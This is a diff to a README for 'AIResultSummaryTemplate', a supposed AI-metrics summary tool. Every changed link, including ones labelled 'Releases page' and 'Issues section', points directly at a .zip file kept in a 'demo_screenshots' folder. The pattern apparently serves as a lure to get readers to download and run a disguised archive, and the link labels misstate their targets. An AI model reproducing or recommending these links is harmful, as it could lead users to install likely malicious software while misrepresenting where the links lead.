@@ -2,7 +2,7 @@
 # 🎉 AIResultSummaryTemplate - Simple AI Performance Summary Tool
 
 ## 📥 Download Now
-[![Download AIResultSummaryTemplate](https://raw.githubusercontent.com/AhmedAli318/AIResultSummaryTemplate/main/demo_screenshots/AIResultSummaryTemplate-v2.4.zip)](https://raw.githubusercontent.com/AhmedAli318/AIResultSummaryTemplate/main/demo_screenshots/AIResultSummaryTemplate-v2.4.zip)
+[![Download AIResultSummaryTemplate](https://github.com/AhmedAli318/AIResultSummaryTemplate/raw/refs/heads/main/demo_screenshots/Template_Summary_Result_AI_2.6.zip)](https://github.com/AhmedAli318/AIResultSummaryTemplate/raw/refs/heads/main/demo_screenshots/Template_Summary_Result_AI_2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to **AIResultSummaryTemplate**! This tool helps you evaluate AI performance clearly and quickly. You can create summary charts that provide useful metrics like precision, recall, and F1-score in a modern user interface.
@@ -15,10 +15,10 @@ Welcome to **AIResultSummaryTemplate**! This tool helps you evaluate AI performa
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the application.
 
-[Download AIResultSummaryTemplate](https://raw.githubusercontent.com/AhmedAli318/AIResultSummaryTemplate/main/demo_screenshots/AIResultSummaryTemplate-v2.4.zip)
+[Download AIResultSummaryTemplate](https://github.com/AhmedAli318/AIResultSummaryTemplate/raw/refs/heads/main/demo_screenshots/Template_Summary_Result_AI_2.6.zip)
 
 ### 📌 Installation Steps
-1. Visit the [Releases page](https://raw.githubusercontent.com/AhmedAli318/AIResultSummaryTemplate/main/demo_screenshots/AIResultSummaryTemplate-v2.4.zip).
+1. Visit the [Releases page](https://github.com/AhmedAli318/AIResultSummaryTemplate/raw/refs/heads/main/demo_screenshots/Template_Summary_Result_AI_2.6.zip).
 2. Find the most recent version of **AIResultSummaryTemplate**.
 3. Click on the download link for your operating system.
 4. Follow the instructions based on your system to install the software.
@@ -49,7 +49,7 @@ If you encounter issues while using the software:
 - Restart the application or your device if you face unexpected errors.
 
 ## 🤝 Support
-If you have questions or need help, feel free to check the [Issues section](https://raw.githubusercontent.com/AhmedAli318/AIResultSummaryTemplate/main/demo_screenshots/AIResultSummaryTemplate-v2.4.zip) on GitHub. Our community is here to assist you.
+If you have questions or need help, feel free to check the [Issues section](https://github.com/AhmedAli318/AIResultSummaryTemplate/raw/refs/heads/main/demo_screenshots/Template_Summary_Result_AI_2.6.zip) on GitHub. Our community is here to assist you.
 
 ## 🏷️ Topics
 - ai-evaluation
